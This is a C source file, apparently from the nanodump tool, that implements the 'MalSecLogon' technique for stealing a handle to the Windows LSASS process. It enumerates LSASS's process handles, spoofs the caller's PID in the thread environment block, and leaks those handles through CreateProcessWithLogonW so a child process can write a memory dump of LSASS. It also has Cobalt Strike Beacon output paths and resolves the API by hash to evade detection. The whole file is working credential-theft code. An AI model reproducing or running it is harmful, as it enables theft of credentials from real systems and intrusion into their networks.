#include "malseclogon.h"
#include "handle.h"

PHANDLE_LIST find_process_handles_in_lsass(
    DWORD lsass_pid
)
{
    BOOL success;

    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
    if (!handle_list)
    {
        malloc_failed();
        return NULL;
    }

    ULONG ProcesTypeIndex = 0;
    success = GetTypeIndexByName(&ProcesTypeIndex);
    if (!success)
    {
        intFree(handle_list); handle_list = NULL;
        return NULL;
    }

    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
    if (!handleTableInformation)
    {
        intFree(handle_list); handle_list = NULL;
        return NULL;
    }

    // loop over each handle
    for (ULONG j = 0; j < handleTableInformation->Count; j++)
    {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

        // make sure this handle is from LSASS
        if (handleInfo->UniqueProcessId != lsass_pid)
            continue;

        // make sure the handle has the permissions we need
        if ((handleInfo->GrantedAccess & (LSASS_PERMISSIONS)) != (LSASS_PERMISSIONS))
            continue;

        // make sure the handle is of type 'Process'
        if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
            continue;

        if (handle_list->Count + 1 > MAX_HANDLES)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Too many handles, please increase MAX_HANDLES\n"
            );
            intFree(handleTableInformation); handleTableInformation = NULL;
            intFree(handle_list); handle_list = NULL;
            return NULL;
        }
        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
    }

    intFree(handleTableInformation); handleTableInformation = NULL;
    return handle_list;
}

void change_pid(DWORD new_pid, PDWORD previous_pid)
{
    if (previous_pid)
        *previous_pid = (DWORD)READ_MEMLOC(CID_OFFSET);
    PDWORD pPid = (PDWORD)&(((struct TEB*)NtCurrentTeb())->ClientId);
    // the memory region where the TEB is should be RW
    *pPid = new_pid;
}

void set_command_line(
    LPWSTR command_line,
    LPCSTR program_name,
    LPCSTR dump_path,
    BOOL fork_lsass,
    BOOL use_valid_sig
)
{
    // program path
    wchar_t program_name_w[MAX_PATH];
    mbstowcs(program_name_w, program_name, MAX_PATH);
    wcscpy(command_line, L"\"");
    wcsncat(command_line, program_name_w, MAX_PATH);
    wcsncat(command_line, L"\"", MAX_PATH);
    // dump path
    wchar_t dump_path_w[MAX_PATH];
    mbstowcs(dump_path_w, dump_path, MAX_PATH);
    wcsncat(command_line, L" -w ", MAX_PATH);
    wcsncat(command_line, dump_path_w, MAX_PATH);
    // --fork
    if (fork_lsass)
        wcsncat(command_line, L" -f", MAX_PATH);
    // valid
    if (use_valid_sig)
        wcsncat(command_line, L" -v", MAX_PATH);
    // malseclogon
    wcsncat(command_line, L" -m", MAX_PATH);
    // --stage 2
    wcsncat(command_line, L" --stage2", MAX_PATH);
}

BOOL save_new_process_pid(PPROCESS_LIST process_list, DWORD pid)
{
    if (!process_list)
        return TRUE;

    if (process_list->Count + 1 > MAX_PROCESSES)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Too many processes, please increase MAX_PROCESSES\n"
        );
        return FALSE;
    }
    process_list->ProcessId[process_list->Count++] = pid;
    return TRUE;
}

// wait until the process exits and check if the dumpfile exists
BOOL check_if_succeded(
    DWORD new_pid,
    LPCSTR dump_path
)
{
    // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
    HANDLE hSpoofedProcess = get_process_handle(
        new_pid,
        SYNCHRONIZE,
        FALSE
    );
    if (!hSpoofedProcess)
        return FALSE;

    BOOL success = wait_for_process(hSpoofedProcess);
    if (!success)
        return FALSE;

    NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
    if (!file_exists(dump_path))
        return FALSE;

    return TRUE;
}

void kill_created_processes(
    PPROCESS_LIST created_processes
)
{
    if (!created_processes)
        return;

    for (DWORD i = 0; i < created_processes->Count; i++)
    {
        kill_process(created_processes->ProcessId[i]);
    }
    intFree(created_processes); created_processes = NULL;
}

/*
 * MalSecLogon can be used agains nanodump itself (writing it to disk)
 * or use a another binary (like notepad.exe) and duplicate
 * the leaked handle in order to remain fileless
 */
BOOL MalSecLogon(
    LPCSTR binary_path,
    LPCSTR dump_path,
    BOOL fork_lsass,
    BOOL use_valid_sig,
    BOOL use_malseclogon_locally,
    DWORD lsass_pid,
    PPROCESS_LIST* Pcreated_processes
)
{
    PPROCESS_LIST created_processes;
    BOOL success;

#ifdef BOF
    BeaconPrintf(CALLBACK_OUTPUT,
#else
    printf(
#endif
        "[!] MalSecLogon implementation is unstable, errors are to be expected\n"
    );
    // if MalSecLogon is used to create other processes, save their PID
    if (!use_malseclogon_locally)
    {
        created_processes = intAlloc(sizeof(PROCESS_LIST));
        if (!created_processes)
        {
            *Pcreated_processes = NULL;
            malloc_failed();
            return FALSE;
        }
        *Pcreated_processes = created_processes;
    }
    // leak an LSASS handle using MalSecLogon
    success = malseclogon_stage_1(
        binary_path,
        dump_path,
        fork_lsass,
        use_valid_sig,
        use_malseclogon_locally,
        lsass_pid,
        created_processes
    );
    if (!success)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_OUTPUT,
#else
        printf(
#endif
            "MalSecLogon technique failed!\n"
        );
        if (created_processes)
        {
            intFree(created_processes); created_processes = NULL;
            *Pcreated_processes = NULL;
        }
        return FALSE;
    }
    if (use_malseclogon_locally)
    {
        // MalSecLogon created a new nanodump process which created the dump
        print_success(
            dump_path,
            use_valid_sig,
            TRUE
        );
    }
    return TRUE;
}

BOOL malseclogon_stage_1(
    LPCSTR program_name,
    LPCSTR dump_path,
    BOOL fork_lsass,
    BOOL use_valid_sig,
    BOOL use_malseclogon_locally,
    DWORD lsass_pid,
    PPROCESS_LIST process_list
)
{
    BOOL success;
    PHANDLE_LIST handle_list;

    // if the file already exists, delete it
    if (file_exists(dump_path))
    {
        if (!delete_file(dump_path))
        {
            return FALSE;
        }
    }

    wchar_t command_line[MAX_PATH];
    set_command_line(
        command_line,
        program_name,
        dump_path,
        fork_lsass,
        use_valid_sig
    );

    handle_list = find_process_handles_in_lsass(
        lsass_pid
    );
    if (!handle_list)
        return FALSE;

    if (handle_list->Count == 0)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "No process handles found in LSASS, is the PID %ld correct?.\n",
            lsass_pid
        );
        intFree(handle_list); handle_list = NULL;
        return FALSE;
    }

    // change our PID to the LSASS PID
    DWORD original_pid;
    change_pid(lsass_pid, &original_pid);

    PROCESS_INFORMATION procInfo;
    STARTUPINFOW startInfo;
    wchar_t filename[MAX_PATH];
    mbstowcs(filename, program_name, MAX_PATH);

    // find the address of CreateProcessWithLogonW dynamically
    CREATEPROCESSWITHLOGONW CreateProcessWithLogonW;
    CreateProcessWithLogonW = (CREATEPROCESSWITHLOGONW)GetFunctionAddress(
        GetLibraryAddress(ADVAPI32),
        CreateProcessWithLogonW_SW2_HASH
    );
    if (!CreateProcessWithLogonW)
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Address of 'CreateProcessWithLogonW' not found\n"
        );
#endif
        intFree(handle_list); handle_list = NULL;
        return FALSE;
    }

    DWORD handles_leaked = 0;
    while (handles_leaked < handle_list->Count)
    {
        memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
        memset(&startInfo, 0, sizeof(STARTUPINFOW));
        startInfo.dwFlags = STARTF_USESTDHANDLES;

        startInfo.hStdInput = handle_list->Handle[handles_leaked++];

        if (handle_list->Count > handles_leaked)
            startInfo.hStdOutput = handle_list->Handle[handles_leaked++];

        if (handle_list->Count > handles_leaked)
            startInfo.hStdError = handle_list->Handle[handles_leaked++];

        success = CreateProcessWithLogonW(
            L"NanoDumpUser",
            L"NanoDumpDomain",
            L"NanoDumpPwd",
            LOGON_NETCREDENTIALS_ONLY,
            filename,
            command_line,
            0,
            NULL,
            NULL,
            &startInfo,
            &procInfo
        );
        if (!success)
        {
            function_failed("CreateProcessWithLogonW");
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return FALSE;
        }

        // save the PID of the newly created process
        success = save_new_process_pid(process_list, procInfo.dwProcessId);
        if (!success)
        {
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return FALSE;
        }

        // if MalSecLogon was used against nanodump, check if the minidump was created
        if (use_malseclogon_locally)
        {
            success = check_if_succeded(
                procInfo.dwProcessId,
                dump_path
            );
            if (success)
            {
                change_pid(original_pid, NULL);
                intFree(handle_list); handle_list = NULL;
                return TRUE;
            }
        }
    }

    // restore the original PID
    change_pid(original_pid, NULL);
    intFree(handle_list); handle_list = NULL;
    if (use_malseclogon_locally)
    {
        // the new nanodump process was unable to create the minidump
        return FALSE;
    }
    else
    {
        // all the processes with the leaked handles have been created
        return TRUE;
    }
}

#ifndef BOF
HANDLE malseclogon_stage_2(
    LPCSTR dump_path
)
{
    // if the file already exists, exit
    if (file_exists(dump_path))
        return NULL;

    for (DWORD leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4)
    {
        if (!is_lsass((HANDLE)(ULONG_PTR)leakedHandle))
        {
            NtClose((HANDLE)(ULONG_PTR)leakedHandle);
            continue;
        }
        return (HANDLE)(ULONG_PTR)leakedHandle;
    }
    return NULL;
}
#endif
